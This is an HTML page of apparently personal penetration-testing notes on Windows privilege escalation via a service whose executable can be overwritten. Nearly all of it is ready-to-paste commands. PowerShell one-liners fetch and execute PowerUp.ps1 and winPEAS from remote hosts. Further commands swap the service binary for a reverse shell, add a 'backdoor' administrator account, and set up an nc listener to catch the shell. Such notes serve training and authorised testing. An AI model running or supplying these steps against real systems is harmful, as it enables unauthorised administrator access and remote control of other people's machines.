<!doctype html>
<html>

<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>manual</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>

<body>
  <div class='page'>
    <h1 class='title'>manual</h1><br /><br />Github: <a
      href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" target="_blank">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1</a><br /><br />1.
    Check for service misconfigurations:<br /> ◇ <span style="text-decoration:underline;">PowerUp.ps1 with method
      Get-ModifiableServiceFile</span> <br /> Enumerates all services by querying the WMI win32_service class. For each
    service, it takes the pathname (aka binPath) and passes it to Get-ModifiablePath to determine if the current user
    has rights to modify the service binary itself or any associated arguments.<br /> If the associated binary (or any
    configuration files) can be overwritten, privileges may be able to be escalated.<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;);Get-ModifiableServiceFile
      </div>
    </div><br /> <a href=""><img src="images/1162-1.png" alt="images/1162-1.png" /></a><br /> ◇ WinPeas: <a
      href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe" target="_blank">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe</a><br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe&quot;,&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&nbsp;quiet&nbsp;servicesinfo&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\winPEASany.exe&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1162-2.png" alt="images/1162-2.png" /></a><br /><br />2. Confirm that we
    can modify the file<br /> ◇ AccessChk:<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-quvw&nbsp;&#39;C:\Program&nbsp;Files\File&nbsp;Permissions&nbsp;Service\filepermservice.exe&#39;&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1162-3.png" alt="images/1162-3.png" /></a><br /><br />3. Confirm that we
    can START/STOP the service<br /> ◇ AccessChk:<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;(new-object&nbsp;System.Net.WebClient).DownloadFile(&quot;https://web.archive.org/web/20071007120748if_/http://download.sysinternals.com/Files/Accesschk.zip&quot;,&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;);$ZippedFilePath&nbsp;=&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;$DestinationFolder&nbsp;=&nbsp;&quot;$env:userprofile\desktop\&quot;;[void]&nbsp;(New-Item&nbsp;-Path&nbsp;$DestinationFolder&nbsp;-ItemType&nbsp;Directory&nbsp;-Force);$Shell&nbsp;=&nbsp;new-object&nbsp;-com&nbsp;Shell.Application;$Shell.Namespace($DestinationFolder).copyhere($Shell.NameSpace($ZippedFilePath).Items(),4);Invoke-Expression&nbsp;&quot;$env:userprofile\desktop\accesschk.exe&nbsp;/accepteula&nbsp;-uvqc&nbsp;filepermsvc&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.exe&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Eula.txt&quot;;Remove-Item&nbsp;-Path&nbsp;&quot;$env:userprofile\desktop\Accesschk.zip&quot;;
      </div>
    </div><br /> <a href=""><img src="images/1162-4.png" alt="images/1162-4.png" /></a><br /><br />4. Create a backup of
    the original service executable:<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;copy&nbsp;&quot;C:\Program&nbsp;Files\File&nbsp;Permissions&nbsp;Service\filepermservice.exe&quot;&nbsp;C:\Temp
      </div>
    </div><br />5. Now we can overwrite the service executable, we have different possibilities:<br /> ◇ Copy the
    reverse shell executable to overwrite the service executable:<br />
    <div class="codebox">
      <div class="codebox">
        C:\&gt;&nbsp;copy&nbsp;/Y&nbsp;C:\PrivEsc\reverse.exe&nbsp;&quot;C:\Program&nbsp;Files\File&nbsp;Permissions&nbsp;Service\filepermservice.exe&quot;
      </div>
    </div><br /> ◇ Create a new Administrator account<br />
    <div class="codebox">
      <div class="codebox">
        PS&gt;&nbsp;IEX(New-Object&nbsp;Net.WebClient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;);Install-ServiceBinary&nbsp;-Name&nbsp;&#39;filepermsvc&#39;&nbsp;-Command&nbsp;“net&nbsp;user&nbsp;backdoor&nbsp;Password123!&nbsp;/add&nbsp;&amp;&amp;&nbsp;timeout&nbsp;/t&nbsp;5&nbsp;&amp;&amp;&nbsp;net&nbsp;localgroup&nbsp;Administrators&nbsp;backdoor&nbsp;/add”
      </div>
    </div><br /> <br />6. Start a listener on Kali, and then start the service to trigger the exploit:<br /> 1) Listener
    on kali<br />
    <div class="codebox">
      <div class="codebox">root@kali:/#&nbsp;nc&nbsp;-nvlp&nbsp;53</div>
    </div><br /> 2) Start the service<br />
    <div class="codebox">
      <div class="codebox">C:\&gt;&nbsp;net&nbsp;start&nbsp;filepermsvc</div>
    </div><br /> <a href=""><img src="images/1162-5.png" alt="images/1162-5.png" /></a><br /><br /><br /><br />
    <br /><br /><br /><br />Bibliography:<br />• <a
      href="https://pentestlab.blog/2017/03/30/weak-service-permissions/" target="_blank">https://pentestlab.blog/2017/03/30/weak-service-permissions/</a>
  </div>
</body>

</html>